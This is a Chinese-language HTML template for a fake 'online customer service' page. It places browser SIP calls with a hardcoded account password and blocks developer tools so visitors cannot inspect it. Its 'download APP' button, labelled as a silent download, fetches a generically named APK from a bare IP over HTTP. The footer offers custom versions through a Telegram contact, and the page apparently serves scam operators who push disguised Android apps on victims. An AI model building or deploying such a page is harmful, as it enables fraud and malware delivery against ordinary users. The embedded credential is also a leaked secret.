<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>网页呼叫客服</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .main-content {
      transform: translateY(-3cm);
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    h1 {
      font-size: 28px;
      color: #333;
      margin-bottom: 20px;
    }
    #callButton, #hangupButton, #downloadApkButton {
      padding: 18px 36px;
      font-size: 22px;
      margin: 15px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    #callButton {
      background-color: #28a745;
      color: white;
    }
    #callButton:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    #hangupButton {
      background-color: #dc3545;
      color: white;
    }
    #hangupButton:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    #downloadApkButton {
      background-color: #007bff;
      color: white;
    }
    #callStatus {
      font-size: 18px;
      margin-top: 10px;
      color: #333;
    }
    .footer {
      position: absolute;
      bottom: 20px;
      width: 90%;
      max-width: 800px;
      font-size: 20px;
      color: #555;
      text-align: center;
      line-height: 1.6;
    }
  </style>
</head>
<body>

  <div class="main-content">
    <h1>欢迎来到在线客服中心</h1>

    <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
    <button id="downloadApkButton">⬇️ 下载APP</button>

    <div id="callStatus">未呼叫</div>
    <audio id="audioRemote" autoplay></audio>
  </div>

  <div class="footer">
    <strong>测试指南</strong><br>
    点击“呼叫客服”按钮开始通话。<br>
    通话过程中，您可以随时点击“挂断”按钮结束通话。<br>
    内容、页面、链接等等一切都可以按照您的需求定制，请联系 Telegram（飞机）客服人员。
  </div>

  <!-- ✅ 引入 JsSIP 和适配库 -->
  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>

  <!-- ✅ 引入 disable-devtool 插件 -->
  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');

      const configuration = {
        sockets: [socket],
        uri: 'sip:100110@xin.anjre.cn',
        password: 'Aa6363463@',
        display_name: '网页客户',
        session_timers: false,
        register: true
      };

      const ua = new JsSIP.UA(configuration);
      let session = null;
      let isCalling = false;

      ua.on('connected', () => console.log('已连接到 SIP WebSocket'));
      ua.on('registered', () => console.log('✅ 注册成功'));
      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
      ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
      ua.start();

      const callButton = document.getElementById('callButton');
      const hangupButton = document.getElementById('hangupButton');
      const statusDisplay = document.getElementById('callStatus');
      const remoteAudio = document.getElementById('audioRemote');

      function updateStatus(text) {
        statusDisplay.textContent = text;
      }

      window.makeCall = function () {
        if (isCalling) return;

        isCalling = true;
        callButton.disabled = true;
        hangupButton.disabled = false;
        updateStatus("正在呼叫...");

        session = ua.call('sip:80088@xin.anjre.cn', {
          mediaConstraints: { audio: true, video: false },
          rtcOfferConstraints: {
            offerToReceiveAudio: 1,
            offerToReceiveVideo: 0
          }
        });

        session.connection.addEventListener('addstream', function (e) {
          remoteAudio.srcObject = e.stream;
          remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
        });

        session.on('progress', () => updateStatus("振铃中..."));
        session.on('accepted', () => updateStatus("通话中"));
        session.on('ended', () => {
          updateStatus("通话结束");
          resetUI();
        });
        session.on('failed', (e) => {
          updateStatus("呼叫失败");
          console.error('呼叫失败:', e);
          resetUI();
        });
      };

      window.hangupCall = function () {
        if (session) {
          session.terminate();
        }
      };

      function resetUI() {
        isCalling = false;
        callButton.disabled = false;
        hangupButton.disabled = true;
        session = null;
      }

      // 新增：下载 APK 按钮静默下载逻辑
      const downloadApkButton = document.getElementById('downloadApkButton');
      downloadApkButton.addEventListener('click', () => {
        const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk'; // 你的 APK 文件地址
        const a = document.createElement('a');
        a.href = url;
        a.download = 'Android_8.9.28.10155_537147618_64.apk'; // 文件名可自定义
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      });

    });
  </script>
</body>
</html>
